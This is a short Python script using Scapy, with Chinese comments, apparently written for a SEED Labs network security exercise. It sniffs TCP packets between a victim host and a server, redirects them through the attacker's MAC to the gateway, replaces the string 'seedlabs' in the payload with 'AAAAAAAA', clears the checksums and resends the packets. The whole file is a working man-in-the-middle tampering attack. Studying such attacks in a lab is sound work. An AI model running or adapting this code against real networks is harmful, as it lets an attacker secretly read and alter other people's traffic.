#! /usr/bin/env python
# -*- coding: utf-8 -*-
from scapy.all import * #导入scapy包

# -----------------------------------------------------
IP_A = '192.168.60.2'   # 受害机A的IP
IP_B = '10.0.2.7'   # 服务器的IP

MAC_gw = '02:42:22:05:fa:2e'    # 网关机的MAC地址
MAC_C = '02:42:c0:a8:3c:05' # 攻击机的MAC地址

# 篡改信息
# 务必保持修改前后数据大小相等，因为只对一侧进行了欺骗，无法通过修改ack和seq来达到修改数据长度的目的
old_str = 'seedlabs'
new_str = 'AAAAAAAA'

# -----------------------------------------------------


# delete the checksum and length
def delete_checksum(pkt):
    del pkt.chksum
    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[TCP].chksum
    return pkt


def spoof(pkt):
    try:
        if pkt.src == MAC_C:
            # 如果是攻击机发出的包，则直接返回
            return
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            # 如果是A给服务器发的包
            # 将包发送给网关机
            pkt[Ether].src = MAC_C
            pkt[Ether].dst = MAC_gw
            pkt[IP].ttl -= 1    # 设置TTL
            old_data = pkt[TCP].load    # 获取原始数据
            print('old_data:', old_data)    # 打印原始数据
            new_data = old_data.replace(old_str, new_str)   # 替换数据
            print('new_data:', new_data)    # 打印替换后的数据
            pkt[TCP].load = new_data    # 设置新数据
            pkt = delete_checksum(pkt)  # 删除旧的checksum
            sendp(pkt, verbose=0)   # 发送包
    except Exception as e:
        print (e)

if __name__ == '__main__':
    f = 'tcp and host {} and host {}'.format(IP_A, IP_B)    # 设置过滤器
    sniff(filter=f, prn=spoof)